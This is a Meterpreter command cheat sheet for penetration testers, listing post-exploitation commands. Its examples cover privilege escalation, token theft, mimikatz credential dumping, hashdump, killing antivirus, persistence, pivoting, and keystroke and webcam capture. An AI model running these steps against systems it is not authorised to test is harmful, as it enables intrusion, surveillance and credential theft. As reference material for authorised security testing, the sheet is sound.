#Meterpreter Cheat Sheet
#Jason Soto <www.jsitech.com>

#Core Commands
    ?                         Help menu
    background                Backgrounds the current session
    bgkill                    Kills a background meterpreter script
    bglist                    Lists running background scripts
    bgrun                     Executes a meterpreter script as a background thread
    channel                   Displays information about active channels
    close                     Closes a channel
    disable_unicode_encoding  Disables encoding of unicode strings
    enable_unicode_encoding   Enables encoding of unicode strings
    exit                      Terminate the meterpreter session
    help                      Help menu
    info                      Displays information about a Post module
    interact                  Interacts with a channel
    irb                       Drop into irb scripting mode
    load                      Load one or more meterpreter extensions
    migrate                   Migrate the server to another process
    quit                      Terminate the meterpreter session
    read                      Reads data from a channel
    resource                  Run the commands stored in a file
    run                       Executes a meterpreter script or Post module
    use                       Deprecated alias for 'load'
    write                     Writes data to a channel


#Stdapi: File system Commands
    cat           Read the contents of a file to the screen
    cd            Change directory
    download      Download a file or directory
    edit          Edit a file
    getlwd        Print local working directory
    getwd         Print working directory
    lcd           Change local working directory
    lpwd          Print local working directory
    ls            List files
    mkdir         Make directory
    mv            Move source to destination
    pwd           Print working directory
    rm            Delete the specified file
    rmdir         Remove directory
    search        Search for files
    upload        Upload a file or directory


#Stdapi: Networking Commands
    arp           Display the host ARP cache
    getproxy      Display the current proxy configuration
    ifconfig      Display interfaces
    ipconfig      Display interfaces
    netstat       Display the network connections
    portfwd       Forward a local port to a remote service
    route         View and modify the routing table


#Stdapi: System Commands
    clearev       Clear the event log
    drop_token    Relinquishes any active impersonation token.
    execute       Execute a command
    getenv        Get one or more environment variable values
    getpid        Get the current process identifier
    getprivs      Attempt to enable all privileges available to the current process
    getsid        Get the SID of the user that the server is running as
    getuid        Get the user that the server is running as
    kill          Terminate a process
    ps            List running processes
    reboot        Reboots the remote computer
    reg           Modify and interact with the remote registry
    rev2self      Calls RevertToSelf() on the remote machine
    shell         Drop into a system command shell
    shutdown      Shuts down the remote computer
    steal_token   Attempts to steal an impersonation token from the target process
    suspend       Suspends or resumes a list of processes
    sysinfo       Gets information about the remote system, such as OS


#Stdapi: User interface Commands
    enumdesktops   List all accessible desktops and window stations
    getdesktop     Get the current meterpreter desktop
    idletime       Returns the number of seconds the remote user has been idle
    keyscan_dump   Dump the keystroke buffer
    keyscan_start  Start capturing keystrokes
    keyscan_stop   Stop capturing keystrokes
    screenshot     Grab a screenshot of the interactive desktop
    setdesktop     Change the meterpreters current desktop
    uictl          Control some of the user interface components


#Stdapi: Webcam Commands
    record_mic     Record audio from the default microphone for X seconds
    webcam_chat    Start a video chat
    webcam_list    List webcams
    webcam_snap    Take a snapshot from the specified webcam
    webcam_stream  Play a video stream from the specified webcam


#Priv: Elevate Commands
    getsystem     Attempt to elevate your privilege to that of local system.


#Priv: Password database Commands
    hashdump      Dumps the contents of the SAM database


#Priv: Timestomp Commands
    timestomp     Manipulate file MACE attributes

#Commands by Meterpreter extensions

#Incognito Commands
    add_group_user       Attempt to add a user to a global group with all tokens
    add_localgroup_user  Attempt to add a user to a local group with all tokens
    add_user             Attempt to add a user with all tokens
    impersonate_token    Impersonate specified token
    list_tokens          List tokens available under current user context
    snarf_hashes         Snarf challenge/response hashes for every token


#Mimikatz Commands
    kerberos          Attempt to retrieve kerberos creds
    livessp           Attempt to retrieve livessp creds
    mimikatz_command  Run a custom commannd
    msv               Attempt to retrieve msv creds (hashes)
    ssp               Attempt to retrieve ssp creds
    tspkg             Attempt to retrieve tspkg creds
    wdigest           Attempt to retrieve wdigest creds


#Sniffer Commands
    sniffer_dump        Retrieve captured packet data to PCAP file
    sniffer_interfaces  Enumerate all sniffable network interfaces
    sniffer_release     Free captured packets on a specific interface instead of downloading them
    sniffer_start       Start packet capture on a specific interface
    sniffer_stats       View statistics of an active capture
    sniffer_stop        Stop packet capture on a specific interface


#Lanattacks: DHCP Commands
    dhcp_load_options  Load DHCP optionis from a datastore
    dhcp_log           Log DHCP server activity
    dhcp_reset         Reset the DHCP server
    dhcp_set_option    Set a DHCP server option
    dhcp_start         Start the DHCP server
    dhcp_stop          Stop the DHCP server


#Lanattacks: TFTP Commands
    tftp_add_file  Add a file to the TFTP server
    tftp_reset     Reset the TFTP server
    tftp_start     Start the TFTP server
    tftp_stop      Stop the TFTP server


#Espia Commands
    screengrab    Attempt to grab screen shot from process's active desktop


#Examples
#Migrate to a given process ID

meterpreter > migrate 1450

#Load meterpreter extension

meterpreter > load mimikatz
meterpreter > load incognito

#Get info on a Post Module

meterpreter > info [post_module]

#Privilege Escalation

meterpreter > use priv
meterpreter > getsystem
meterpreter > getuid

#Steal Token
meterpreter > steal_token [user PID]

#Example
meterpreter > steal_token 420

#Token Impersonation
meterpreter > use incognito
meterpreter > list_tokens -u
meterpreter > impersonate_token DOMAIN\User

#Attempt to create user on Domain Controller
meterpreter > add_user newuser password -h 192.168.20.30

#Use Meterpreter Session to Pivot onto other Systems

meterpreter > run get_local_subnets
meterpreter > background
msf exploit(handler) > route add <localsubnet> <netmask> [session]run

#run Post modules
meterpreter > run [postmodule]

#Example
meterpreter > run killav
meterpreter > run hashdump
meterpreter > run persistence

#See all post modules you can run
meterpreter > run <tab> <tab>

#Attempt to retrieve Kerberos o Livessp credentials
meterpreter > load mimikatz
meterpreter > kerberos
meterpreter > livessp


